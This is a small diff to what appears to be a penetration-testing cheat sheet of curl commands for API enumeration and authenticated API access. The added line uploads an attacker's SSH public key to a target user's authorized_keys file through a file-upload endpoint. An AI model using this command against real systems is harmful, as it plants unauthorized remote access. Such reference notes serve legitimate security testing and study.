@@ -6,6 +6,7 @@
 
     * curl -sv http://DOMAIN.LOCAL/api (Enumerate all API endpoints)
     * curl -sv http://DOMAIN.LOCAL/api --cookie "PHPSESSID=SESSION\_NUM" | jq (Authenticated api access)
+    curl -H 'Content-Type: multipart/form-data' -F file'@//home/ATTACKER/.ssh/id_rsapub.txt' -F filename='/home/USER/.ssh/authorized_keys' http://api.local/file-upload (Upload a file with cURL)
 
 ### cURL
 
